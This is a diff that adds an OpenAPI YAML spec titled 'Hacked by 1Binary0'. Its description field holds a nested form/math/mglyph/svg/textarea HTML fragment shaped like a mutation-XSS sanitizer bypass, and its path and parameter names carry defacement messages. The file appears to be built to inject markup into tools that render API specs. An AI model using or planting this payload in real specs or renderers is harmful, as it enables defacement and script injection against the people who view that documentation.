@@ -1,0 +1,15 @@
+---
+openapi: 3.0.1
+info:
+  title: Hacked by 1Binary0
+  description: |
+   <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>1binary0"></form>
+   
+  version: '1.0'
+paths:
+  "/path/malformed/by/1binary0":
+    post:
+      tags:
+      - 1binary0
+      parameters:
+      - name: You have been hacked 1binary0
